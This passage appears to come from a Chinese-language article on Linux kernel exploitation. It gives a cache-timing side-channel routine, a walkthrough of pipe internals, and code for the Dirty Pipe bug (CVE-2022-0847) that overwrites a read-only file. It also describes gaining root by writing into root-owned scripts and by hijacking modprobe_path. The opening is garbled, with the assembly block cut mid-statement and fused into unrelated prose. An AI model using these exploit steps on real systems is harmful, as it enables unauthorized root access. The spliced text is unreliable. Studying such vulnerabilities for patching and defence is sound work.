                    data[idx] += time;
            }
        }
    uint64_t sidechannel(uint64_t addr) {
      uint64_t a, b, c, d;
      asm volatile (".intel_syntax noprefix;"
        "mfence;"
        "rdtscp;"
        "mov %0, rax;"
        "mov %1, rdx;"
        "xor rax, rax;"
        "lfence;"
        "prefetchnta qword ptr [%4];"
        "prefetcht2 qword ptr [%4];"
        "xor rax, rax;"
        "lfence;"
        "rdtscp;"
        "mov %2, rax;"
        "mov %3, rdx;"
        "mfence;"
        ".att_syntax;"
        : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
        : "r" (addr)
        : "rax", "rbx", "rcx", "rdx");
      a = (b i_pipe). 其中包含一个管道的所有信息。当创建一个管道时，内核会创建 **VFS
inode** ， **pipe_inode_info** 结构体、两个文件描述符（代表着管道的两端）、 **pipe_buffer**
结构体数组。管道原理的示意图列。
用来表示管道中数据的是一个 **pipe_buffer** 结构数组，单个 **pipe_buffer** 结构体用来表示管道中单张内存页的数据：
    /**
     *  struct pipe_buffer - a linux kernel pipe buffer
     *  @page: 管道缓冲区存放了数据的页
     *  @offset: 在@page中数据的偏移
     *  @len: 在@page中数据的长度
     *  @ops: 该buffer的函数表，参见@pipe_buf_operations.
     *  @flags: 管道缓冲区的标志位，
     *  @private: 函数表的私有数据
     **/
    struct pipe_buffer {
        struct page *page;
        unsigned int offset, len;
        const struct pipe_buf_operations *ops;
        unsigned int flags;
        unsigned long private;
    };
有两个系统调用可以创建管道，pipe、pipe2.这两个系统调用最终都会调到 do_pipe2()函数。
存在如下调用链：
    do_pipe2()
        __do_pipe_flags()
            create_pipe_files()
                get_pipe_inode()
                    alloc_pipe_info()
最终调用 kcalloc()分配一个 pipe_buffer数组，默认数量为 PIPE_DEF_BUFFERS（16）.
即一个管道初始默认可以存放16张页面的数据.
pipe_inode_info创建:
    struct pipe_inode_info *alloc_pipe_info(void)
    {
        struct pipe_inode_info *pipe;
        unsigned long pipe_bufs = PIPE_DEF_BUFFERS; // 这个是 16
        struct user_struct *user = get_current_user();
        unsigned long user_bufs;
        unsigned int max_size = READ_ONCE(pipe_max_size);
        pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);
        //...
        pipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),
                     GFP_KERNEL_ACCOUNT);
pipe链接到 inode节点上
    static struct inode * get_pipe_inode(void)
    {
        struct inode *inode = new_inode_pseudo(pipe_mnt->mnt_sb);
        struct pipe_inode_info *pipe;
        ...
        pipe = alloc_pipe_info();   //创建 pipe
        if (!pipe)
            goto fail_iput;
        inode->i_pipe = pipe;       // pipe 链接到 inode节点上
        ...
示意图：
管道的本体是 pipe_inode_info 结构体，其管理
pipe_buffer数组的方式本质上是一个循环队列，其head成员标识队列头的idx、tail成员表示队列尾的idx，头进尾出.
管道的写入过程
查表pipefifo_fops可知当向管道写入数据时，会调用到pipe_write函数。流程如下：
  * 若感到非空且上一个buf未满，则先尝试向上一个被写入的buffer写入数据（若该buffer设置了 **PIPE_BUF_FLAG_CAN_MERGE** 标志位）
  * 接下来开始对新的buffer进行数据写入，若没有 **PIPE_BUF_FLAG_CAN_MERGE** 标志位则分配新页面后写入
  * 循环第二步直到完成写入，若管道满了则会尝试唤醒read读取让管道腾出空间。
这里可知 **PIPE_BUF_FLAG_CAN_MERGE** 用以标识一个 **pipe_buffer**
是否已经分配了可以写入的空间。在大循环中若对于 **pipe_buffer** 没有设置该 **flag**
（刚被初始化），则会新分配一个页面供写入，并设置该表示位。
管道的读出过程
查表管道读出数据时调用 pipe_read,主要是读取buffer对应的page上的数据，若一个buffer被读完了则将其出列。
对于一个刚刚建立的管道，其 buffer 数组其实并没有分配对应的页面空间，也没有设置标志位；在我们向管道内写入数据时会通过 buddy system
为对应 buffer 分配新的页框， **并设置 PIPE_BUF_FLAG_CAN_MERGE 标志位，标志该 buffer 可以进行写入**
；而当我们从管道中读出数据之后，纵使一个 buffer 对应的 page 上的数据被读完了，我们也不会释放该 page，而是会直接投入到下一次使用中，
**因此会保留 PIPE_BUF_FLAG_CAN_MERGE 标志位。**
写入时会设置 **PIPE_BUF_FLAG_CAN_MERGE 标志位。** 读出时会保留 **PIPE_BUF_FLAG_CAN_MERGE
标志位。**
splice：文件与管道间数据拷贝
当我们想要将一个文件的数据拷贝到另一个文件时，比较朴素的一种想法是打开两个文件后将源文件数据读入后再写入目标文件，但这样的做法需要在用户空间与内核空间之间来回进行数据拷贝，
**具有可观的开销。**
因此为了减少这样的开销， splice这一个非常独特的系统调用应运而生，其作用是 **在文件与管道之间进行数据拷贝** ，以此
**将内核空间与用户空间之间的数据拷贝转变为内核空间内的数据拷贝，从而避免了数据在用户空间与内核空间之间的拷贝造成的开销。**
当你想要将数据从一个文件描述符拷贝到另一个文件描述符中，只需要先创建一个管道，之后使用 splice 系统调用将数据从源文件描述符拷贝到管道中、再使用
splice 系统调用将数据从管道中拷贝到目的文件描述符即可。这样的设计使得我们只需要两次系统调用便能完成数据在不同文件描述符间的拷贝工作，且
**数据的拷贝都在内核空间中完成，极大地减少了开销。**
漏洞利用
写、读管道，设置 PIPE_BUF_FLAG_CAN_MERGE flag， **将管道写满后再将所有数据读出** ，这样管道的每一个
pipe_buffer 都会被设置上 PIPE_BUF_FLAG_CAN_MERGE 标志位
        pipe(pipe_fd);
        pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
        buffer = (char*) malloc(page_size);
        for (int i = pipe_size; i > 0; )
        {
            if (i > page_size)
                write_size = page_size;
            else
                write_size = i;
            i -= write(pipe_fd[1], buffer, write_size);
        }
        for (int i = pipe_size; i > 0; )
        {
           if(i>page_size)
                read_size = page_size ;
           else
               read_size = i;
            i -= read(pipe_fd[0], buffer, read_size);
        }
调用splice 函数建立 pipe_buffer 与文件的关联（漏洞产生点）使用 splice 系统调用将数据从文件中读入到管道，为了让
pipe_buffer->page 其中一个页替换为文件内存映射页。
    splice(file_fd, &offset_from_file, pipe_fd[1], NULL, 1, 0);
向管道中写入恶意数据，完成越权写入文件， splice
函数使内核中管道建立完页面映射后，head指针会指向下一个pipe_buffer,此时我们再向管道中写入数据，管道计数器会发现上一个 pipe_buffer
没有写满，从而 **将数据拷贝到上一个 pipe_buffer 对应的页面——即文件映射的页面** ，由于 PIPE_BUF_FLAG_CAN_MERGE
仍保留着，因此 **内核会误以为该页面可以被写入** ，从而完成了越权写入文件的操作。
    write(pipe_fd[1], file_fd, data_size);
漏洞测试效果：
flag文件只有读权限没有写权限，使用CVE-2022-0847向这个文件写入内容。
成功向flag写入内容。在实现情况中，向有root权限的脚本中写入提权代码，触发执行即可获得root权限，该方法可减少内核函数地址计算以及安全保护的绕过。
#### 2、kernel5.x版本和kernel4.x版本的不同
在kernel
4.x版本中常用的绕过保护方式,漏洞利用成功控制PC后跳转到native_write_cr4函数关闭SMEP、SMAP保护，使之后部署和执行shellcode提权更为便捷。
但是在kernel 5.x版本中native_write_cr4函数被添加了commit
增加了对CR4寄存器的判断，如检测到了修改就还原CR4寄存器的值，不在是之前那种简单的汇编形式了，像以前一样简单调用函数关闭SMEP和SMAP将不在可行。
现在较为常用的技术是利用漏洞修改常量modprobe_path 的字符串地址，
modprobe_path是用于在Linux内核中添加可加载的内核模块，当我们在Linux内核中安装或卸载新模块时，就会执行这个程序。而当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，也会调用这个
modprobe_path所指向的程序。如果我们将这个字符串指向我们自己的sh文件 ，并使用 system或 execve
去执行一个未知文件类型的错误文件，那么在发生错误的时候就可以执行我们自己的二进制文件了。同样的有了新的利用方法也会出现相对应的保护方法。
### 五、总结
内核保护和利用是一个长期对抗的过程，出现了新的利用方法相应的也会出现新的对抗手段。
安全防护并不能完全保证内核是安全的，一旦有危害性更高的漏洞出现，就很容易打破这些保护使其轻易的获取系统权限。安全不能仅仅依靠这些保护机制，应要时常关注漏洞报送信息或安全邮件组里讨论的安全事件，及时更新安全补丁。
* * *